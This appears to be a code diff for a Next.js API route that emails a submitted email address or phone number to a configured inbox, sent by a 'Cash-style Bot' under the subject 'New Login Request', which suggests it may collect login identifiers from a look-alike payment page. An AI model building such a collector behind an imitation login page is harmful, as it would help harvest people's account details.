@@ -4,29 +4,43 @@ export async function POST(req) {
   try {
     const { email, phone } = await req.json();
 
-    // Buat transporter (contoh Gmail)
+    // Pastikan salah satu ada
+    if (!email && !phone) {
+      return new Response(
+        JSON.stringify({ success: false, message: "Email atau Phone harus diisi" }),
+        { status: 400 }
+      );
+    }
+
+    // Buat pesan sesuai field yang ada
+    let text = "";
+    if (email) text = `Email: ${email}`;
+    if (phone) text = `Phone: ${phone}`;
+
+    // Transporter
     const transporter = nodemailer.createTransport({
       service: "gmail",
       auth: {
-        user: process.env.MAIL_USER, // email kamu
-        pass: process.env.MAIL_PASS, // password / app password
+        user: process.env.MAIL_USER,
+        pass: process.env.MAIL_PASS,
       },
     });
 
-    // Isi email
     const mailOptions = {
       from: `"Cash-style Bot" <${process.env.MAIL_USER}>`,
-      to: process.env.MAIL_TO, // tujuan, bisa ke email kamu
+      to: process.env.MAIL_TO,
       subject: "New Login Request",
-      text: `User submitted:\n\nEmail: ${email}\nPhone: ${phone}`,
+      text,
     };
 
-    // Kirim
     await transporter.sendMail(mailOptions);
 
-    return Response.json({ success: true });
-  } catch (err) {
-    console.error("Error sendmail:", err);
-    return Response.json({ success: false, error: err.message }, { status: 500 });
+    return new Response(JSON.stringify({ success: true }), { status: 200 });
+  } catch (error) {
+    console.error("SendMail Error:", error);
+    return new Response(
+      JSON.stringify({ success: false, message: "Internal server error" }),
+      { status: 500 }
+    );
   }
 }
